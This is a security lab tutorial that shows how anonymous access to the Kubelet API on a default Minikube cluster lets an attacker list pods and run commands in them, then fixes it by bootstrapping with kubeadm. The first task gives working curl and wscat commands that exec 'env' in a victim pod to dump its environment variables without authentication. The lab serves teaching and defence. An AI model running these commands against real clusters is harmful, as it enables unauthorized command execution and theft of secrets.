### Attack the Kubelet API
The Kubelet API is responsible for the master to node communication within a Kubernetes cluster. If you expose your nodes to the internet without some important configurations in place you are going to have a bad time. From the official Kubernetes docs:
"By default, requests to the Kubelet’s HTTPS endpoint that are not rejected by other configured authentication methods are treated as anonymous requests, and given a username of system:anonymous and a group of system:unauthenticated."

So let's exploit this "misconfiguration" within Minikube.

## Task 1: Spin up a default Kubernetes cluster

1. Start Minikube using the default localkube bootstrapper:
```
export MINIKUBE_HOME=~/Desktop/lab-tools/.kube
minikube delete
minikube start
```

2. The Kubelet API runs on every node in a cluster. If an individual has network access to a node in the kubernetes cluster, they are able to do some interesting things by default, including "exec-ing" into running pods.
```
# port 10250 is the read/write port that the Kubelet API uses for communication to the master node
minikube ip
curl --insecure https://$(minikube ip):10250/pods | jq
# jq is a tool to prettify JSON output - it is optional
```

3. As you can see, using a default implementation of Minikube (and many other kubernetes production bootstrappers) we are able to list all of the pods running on a given node with a simple `curl` command. This seems bad, right? Let's try to Exec and do some real damage. First, we launch some victim pods to take over. In the `manifests` directory, run the following command:
```
kubectl create -f .
kubectl get pods
```

4. Now we have our unshorten-api Deployment and Service up and running we can extract details from them using the same `curl` command we used before:
```
curl --insecure https://$(minikube ip):10250/pods | jq
```

5. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`

6. Now, we take that Pod name and run another curl command. Reading Pod data is interesting but we want to do some damage:
```
curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://$(minikube ip):10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env&input=1&output=1&tty=1"
```

7. This opens a stream which we can access using [wscat](https://www.npmjs.com/package/wscat). Take note of the `location:` header as we will be using that value to read from the stream. You can install `wscat` using the link above. Once `wscat` is installed, run the following command:
```
wscat -c "https://$(minikube ip):10250/cri/exec/<valueFrom302>" --no-check
```

You can use cURL too:
### !! Please note that this command only works reliably with the newer versions of cURL. If you are getting errors, try updating cURL !!
```
curl -k --include \
     --no-buffer \
     --header "Connection: Upgrade" \
     --header "Upgrade: websocket" \
     --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
     --header "Sec-WebSocket-Version: 13" \
     https://$(minikube ip):10250/cri/exec/<valueFrom302>
```

8. These are *all of the environment variables* for our unshorten-api pod, printed to the screen, unauthenticated.

See any issues here?

## Task 2: Fix the Issue
There are a number of way to address the kubelet-api "misconfiguration" issue. To do this locally, our most simple solution is to bootstrap our cluster using the `kubeadm` bootstrapper. Out of the box, Minikube still uses `localkube` to build clusters. `localkube` runs every cluster component as a single binary in the Kubernetes environment. This project is in the process of being deprecated in favor of `kubeadm` which offers us a much more robust solution that matches production clusters more closely.
```
minikube delete
minikube start --bootstrapper kubeadm
```

1. Run our `curl` command from before. We see that the response is `Forbidden` which is due to how `kubeadm` bootstraps clusters. `kubeadm` implements authorization of the kubelet by default. Let's take a look at this setting under the hood:
```
curl --insecure https://$(minikube ip):10250/pods
```

2. SSH into our Minikube node and take a look at our kubelet config:
```
minikube ssh
sudo cat /etc/kubernetes/kubelet.conf
```

3. You will see that our config defines a set of certificates which successfully enables authentication between the Master and Nodes.

### Note: `kubeadm` does this by default but this is not always the case for other bootstrap mechanisms or scratch-built clusters! Always manually check that this configuration is enforced!

### Discussion Question: Is your kubelet api configured to block these attacks?
